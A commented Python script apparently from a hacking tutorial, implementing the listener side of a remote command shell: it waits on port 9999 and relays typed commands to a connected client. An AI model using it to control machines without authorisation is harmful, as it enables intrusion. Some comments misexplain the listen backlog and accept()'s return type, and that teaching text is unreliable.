#!/usr/bin/env python
import socket, sys

#sys is used to implement terminal commands within
#the python script

def create_socket():
	
	#attempt to perform the following operation
	try:	
		#a global variable has universal scope
		#throughout the program
	
		global host
		global port
		global s	#s is short for socket

		host = ""
		port = 9999
		s = socket.socket()
	
	#if an error is encountered within the given operation
	#print the error in the variable 'msg'
	except socket.error as msg:
		
		print("Socket creation error: " + str(msg))


#binding the socket and listening for connections

def bind_socket():

	try:
		global host
		global port
		global s
		
		#this may pop an error
		print("[*] Binding the port {}".format(str(port)))

		#the actual binding (tuple format)
		s.bind((host, port))

		#listen on the binded port
		#5 is the number of failed connections 
		#until connection is retried
		s.listen(5)	
	
	except socket.error as msg:

		print("Socket bind error: " + str(msg) + "\n" + "Retrying...")
		
		#this function could be considered recursive 
		#because it calls itself
		bind_socket()
				
#Establish connection with a client (socket must be listening)

def socket_accept():

	#socket.accept() will essential accept the connection
	#that is attempting to be established

	#connection object and address is storing IP address and port
	conn, address = s.accept() #returns a list in the format [ip_address(string), port(integer)]
	print("Connection established! |" + "IP " + address[0] + " | Port" + str(address[1]))
	
	send_commands(conn)

	conn.close()

#send commands to client
def send_commands(conn):
	
	#persistence using an infinite while loop
	while True:
		#take input from the user
		cmd = input()
		#if the quit command is issued, exit the program
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		#if the length of the command entered is
		#greater than 0, do something (input validation)
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end="")
			

def main():

	create_socket()
	bind_socket()
	socket_accept()
	

if __name__ == '__main__':
	main()
